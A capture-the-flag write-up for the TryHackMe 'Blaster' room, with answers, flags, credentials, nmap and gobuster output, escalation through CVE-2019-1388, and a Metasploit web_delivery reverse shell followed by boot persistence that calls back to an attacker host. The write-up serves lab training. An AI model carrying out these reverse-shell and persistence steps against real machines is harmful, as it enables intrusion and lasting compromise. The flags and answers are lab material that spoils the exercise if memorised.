# Blaster

## Task 1 - Deploy the VM (takes a lot of time, 5 minutes)

## Task 2
```
#1 How many ports are open on our target system?

2
```
```
#2 Looks like there's a web server running, what is the title of the page we discover when browsing to it?

IIS Windows Server
```
```
#3 Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?

/retro
```
```
#4 Navigate to our discovered hidden directory, what potential username do we discover?

wade
```
```
#5 Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

parzival
```
```
#6 Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?

THM{HACK_PLAYER_ONE}
```
## Task 3
```
#1 	When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

CVE-2019-1388
```
```
#2 Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?

hhupd
```
```
#3 Research vulnerability and how to exploit it. Exploit it now to gain an elevated 
terminal!
```
```
#4 Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?

nt authority\system
```
```
#5 	Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!

THM{COIN_OPERATED_EXPLOITATION}
```
## Task 4
```
#1 Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
```
```
#2 	First, let's set the target to PSH (PowerShell). Which target number is PSH?

2
```
```
#3 	After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.
```
```
#4 Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.
```
```
#5 Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned. 
```
```
#6 Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. 

run persistence -X
```
```
#7 Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!
```
### CODE

```
export ip=10.10.99.228
```
#### The machine doesnt respond to icmp PING, then using -Pn option
## nmap scan
```
$ nmap -sC -sV -Pn -oN nmap.txt $ip

# Nmap 7.80 scan initiated Thu Jun 25 13:23:06 2020 as: nmap -sC -sV -Pn -oN nmap.txt 10.10.99.228
Nmap scan report for 10.10.99.228
Host is up (0.080s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-06-25T10:23:22+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-05-21T21:44:38
|_Not valid after:  2020-11-20T21:44:38
|_ssl-date: 2020-06-25T10:23:23+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 25 13:23:22 2020 -- 1 IP address (1 host up) scanned in 16.44 seconds

```
```
$ gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.99.228
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/25 13:25:50 Starting gobuster
===============================================================
/retro (Status: 301)
/Retro (Status: 301)

```
Found a $ip/retro dir, website about retro games, on Task #2 I found that the author is Wade, and he left a comment @ $ip/retro/index.php/2019/12/09/ready-player-one/#comment-2, stating:
"
	Wade
	December 9, 2019

Leaving myself a note here just in case I forget how to spell it: parzival
"
so 'parzival' is the potential password from  Task #2, Question #5.

```
Windows RDP CREDS = wade:parzival
```
user.txt @ Desktop : THM{HACK_PLAYER_ONE}

hhupd.exe @ Desktop : found this CVE-2019-1388 @ https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/

https://www.youtube.com/watch?v=3BQKpPNlTSo - video on the exploit from the site above ...
pic2.png - escalated to nt authority\system

pic3.png - root flag
$ type C:\Users\Administrator\Desktop\root.txt: THM{COIN_OPERATED_EXPLOITATION}


used exploit/multi/script/web_delivery in metasploit to host a webserver with the payload and load it on the system via the escalated command prompt

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > run persistence -X
[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
[!] Example: run exploit/windows/local/persistence OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/RETROWEB_20200625.1049/RETROWEB_20200625.1049.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=172.16.0.11 LPORT=4444
[*] Persistent agent script is 99619 bytes long
[+] Persistent Script written to C:\Windows\TEMP\SkuAgAqzolP.vbs
[*] Executing script C:\Windows\TEMP\SkuAgAqzolP.vbs
[+] Agent executed with PID 6012
meterpreter >
```

